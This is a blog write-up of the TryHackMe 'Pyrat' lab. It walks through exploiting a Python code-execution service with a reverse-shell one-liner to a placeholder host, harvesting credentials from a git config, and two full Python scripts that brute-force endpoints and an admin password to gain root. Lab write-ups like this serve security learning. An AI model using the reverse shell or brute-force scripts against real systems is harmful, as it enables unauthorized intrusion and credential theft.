---
title: "Pyrat(Easy)|TryHackMe"
date: 2025-10-29
categories: [Writeups, TryHackMe]
tags: [thm,linux]
---

Summary.

The Tryhackme target has a python server on one of its ports which is vulnerable to code execution.Attackers can leverage that to get a tcp reverse shell connection and futher escalate their privelegds to attain root. Below is a detailed writeup of how I went about attaining foothold on the server and further escalation priviledge to root. Lets go!!!!!!!!!!!!!!!!!!!!!!

![letsgo](/assets/img/posts/2025-10-29-pyrat/letsgo.png)


##### **RECON**

Started with a tcp port scan and got 2 open ports

![rustscan](/assets/img/posts/2025-10-29-pyrat/rustscan.png)


Performed a full tcp scan on port 8000

![rustscan](/assets/img/posts/2025-10-29-pyrat/port8000.png)


viewing port 8000 in the web browser showed a lead .


![web](/assets/img/posts/2025-10-29-pyrat/web.png)



So I connected to the port using nc and I realised the simpleHTTP 0.6 was vulnerable to code execution after a little bit of research online, so I tried some python command and it executed.



![letsgo](/assets/img/posts/2025-10-29-pyrat/codeexec.png)




##### **FOOTHOLD**

I leveraged that to attain a shell. Got foot hold as `www-data` user.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![letsgo](/assets/img/posts/2025-10-29-pyrat/initialaccess.png)


##### **ENUMERATION**

Realized I couldn't `cd` into the think directory after using the `ls -la /home` command

![letsgo](/assets/img/posts/2025-10-29-pyrat/homedir.png)




after some routine enumeration, I landed on a juicy directory in the `/opt` directory which contained a `dev` directory. In the dev directory found a `.git` directory which belongs to `think` user

![letsgo](/assets/img/posts/2025-10-29-pyrat/git.png)


looked through all the files in the `/dev`  directory
![letsgo](/assets/img/posts/2025-10-29-pyrat/devdir.png)
![letsgo](/assets/img/posts/2025-10-29-pyrat/devdir1.png)



In the `./.git` directory there was a juicy file `config`

![letsgo](/assets/img/posts/2025-10-29-pyrat/juicyfile.png)


Cat the config file and got credentials

![letsgo](/assets/img/posts/2025-10-29-pyrat/config.png)

switched user to the think user and got the user flag.

![letsgo](/assets/img/posts/2025-10-29-pyrat/su.png)


Went on to enumerate some suid bit files but ended as nothing to write home about.
Came in mind to check out some git commits or maybe some staged files which were not yet committed so I used the `git status` command and realized there was an action that wasn't staged neither was it committed to the remote git repo.

![letsgo](/assets/img/posts/2025-10-29-pyrat/gitstatus.png)

I restored the deleted file with `git restore` and cat it open to read the content of the file

![letsgo](/assets/img/posts/2025-10-29-pyrat/restore.png)


From the machines description and reading the content of the `pyrat.py.old` file , I realized I would have to use a custom script to brute force the valid endpoints so I first interacted with some valid and invalid endpoints gotten from the `pyrat.py.old` file.

![letsgo](/assets/img/posts/2025-10-29-pyrat/endpoint.png)


From the response I crafted the script below to bruteforce the valid endpoints



```
#!/usr/bin/env python3
import socket
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

def load_wordlist(wordlist_path):
    """Load endpoints from a wordlist file"""
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Wordlist not found at {wordlist_path}")
        sys.exit(1)

def test_endpoint(args):
    """Test a single endpoint and return the response"""
    host, port, endpoint = args
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Reduced timeout for speed
        sock.connect((host, port))

        # Send the endpoint name
        sock.send(f"{endpoint}\n".encode())

        # Receive response
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        sock.close()

        return endpoint, response.strip()

    except:
        return endpoint, ""

def main():
    host = "10.10.4.191"
    port = 8000

    # Try common Kali wordlists
    wordlists = [
        "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
    ]

    wordlist_path = None
    for wl in wordlists:
        if os.path.exists(wl):
            wordlist_path = wl
            break

    if not wordlist_path:
        print("No wordlist found. Please specify one:")
        wordlist_path = input("Wordlist path: ").strip()

    # Load wordlist
    endpoints = load_wordlist(wordlist_path)
    print(f"Testing {len(endpoints)} endpoints with threading...")
    print("Only showing truly valid endpoints (filtering syntax errors):\n")

    valid_endpoints = []

    # Use ThreadPoolExecutor for parallel testing
    with ThreadPoolExecutor(max_workers=50) as executor:
        # Prepare arguments for each endpoint
        args_list = [(host, port, endpoint) for endpoint in endpoints]

        # Submit all tasks
        future_to_endpoint = {executor.submit(test_endpoint, args): args[2] for args in args_list}

        # Process completed tasks
        for i, future in enumerate(as_completed(future_to_endpoint)):
            endpoint, response = future.result()

            # Check if response is NOT the standard error AND is not empty AND not a syntax error
            is_standard_error = "name '" in response and "' is not defined" in response
            is_syntax_error = "invalid syntax" in response
            is_not_empty = response != ""

            if not is_standard_error and not is_syntax_error and is_not_empty:
                print(f"{endpoint} -> {response}")
                valid_endpoints.append((endpoint, response))

            # Progress indicator
            if (i + 1) % 100 == 0:
                print(f"[Progress: {i + 1}/{len(endpoints)}]")

    print(f"\nTotal valid endpoints found: {len(valid_endpoints)}")

if __name__ == "__main__":
    main()
```



Got the valid endpoint and in this endpoint asked for a password.

![letsgo](/assets/img/posts/2025-10-29-pyrat/adminendpoint.png)




From the machines description as well , I had to bruteforce the password , and I used this script to do so.

```
> #!/usr/bin/env python3
> import socket
> import sys
> import os
> import signal
> from concurrent.futures import ThreadPoolExecutor, as_completed
> 
> shutdown_flag = False
> 
> def signal_handler(sig, frame):
>  global shutdown_flag
>  print("\n[!] Ctrl+C detected, shutting down gracefully...")
>  shutdown_flag = True
>  sys.exit(0)
> 
> def load_wordlist(wordlist_path):
>  """Load passwords from a wordlist file"""
>  try:
>  with open(wordlist_path, 'r', errors='ignore') as f:
>  return [line.strip() for line in f if line.strip()]
>  except FileNotFoundError:
>  print(f"Error: Wordlist not found at {wordlist_path}")
>  sys.exit(1)
> 
> def test_password(args):
>  """Test a single password against the admin endpoint"""
>  global shutdown_flag
>  if shutdown_flag:
>  return None, ""
> 
> host, port, password = args
> try:
>  # Create new connection for each attempt (since it resets after 3 attempts)
>  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>  sock.settimeout(3)
>  sock.connect((host, port)) 
> # Send admin endpoint
>  sock.send(b"admin\n") 
> # Wait for password prompt and send password
>  response1 = sock.recv(1024).decode('utf-8', errors='ignore')
>  if "Password:" in response1:
>  sock.send(f"{password}\n".encode()) 
> # Get the response
>  response2 = sock.recv(4096).decode('utf-8', errors='ignore')
>  sock.close() 
> # Check if authentication was successful
>  if "Password:" not in response2 and response2.strip() != "":
>  return password, response2.strip()
>  else:
>  return password, "[FAILED]" 
> except Exception as e:
>  return password, f"[ERROR: {str(e)}]" 
> return password, "[FAILED]"
> def main():
>  global shutdown_flag # Add this line to access the global variable
> 
> signal.signal(signal.SIGINT, signal_handler) 
> host = "10.10.4.191"
> port = 8000 
> # Common password wordlists in Kali
> password_wordlists = [
>  "/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt"
> ] 
> # Find available wordlist
> wordlist_path = None
> for wl in password_wordlists:
>  if os.path.exists(wl):
>  wordlist_path = wl
>  break 
> if not wordlist_path:
>  print("No common password wordlist found. Please specify one:")
>  wordlist_path = input("Password wordlist path: ").strip() 
> # Load passwords
> passwords = load_wordlist(wordlist_path)
> print(f"Loaded {len(passwords)} passwords from {wordlist_path}")
> print("Starting password fuzzing against 'admin' endpoint...")
> print("Press Ctrl+C to stop at any time\n") 
> found_password = None 
> # Use threading but with smaller batches to handle connection resets
> batch_size = 50 # Test 50 passwords at a time 
> for i in range(0, len(passwords), batch_size):
>  if shutdown_flag:
>  break 
> batch = passwords[i:i + batch_size]
>  print(f"[*] Testing batch {i//batch_size + 1}/{(len(passwords)//batch_size) + 1} ({len(batch)} passwords)") 
> with ThreadPoolExecutor(max_workers=10) as executor: # Fewer workers to be gentle
>  args_list = [(host, port, password) for password in batch]
>  futures = [executor.submit(test_password, args) for args in args_list] 
> for future in as_completed(futures):
>  if shutdown_flag:
>  executor.shutdown(wait=False)
>  break 
> password, response = future.result() 
> if response != "[FAILED]" and "[ERROR" not in response:
>  print(f"\n[+] PASSWORD FOUND: {password}")
>  print(f"[+] Response: {response}")
>  found_password = password
>  shutdown_flag = True
>  executor.shutdown(wait=False)
>  break 
> if found_password:
>  print(f"\n[SUCCESS] Use password: {found_password}")
> else:
>  print("\n[!] Password not found in the wordlist")
> if __name__ == "__main__":
>  main()
```



And I got the password and finally got the root shell


![letsgo](/assets/img/posts/2025-10-29-pyrat/root.png)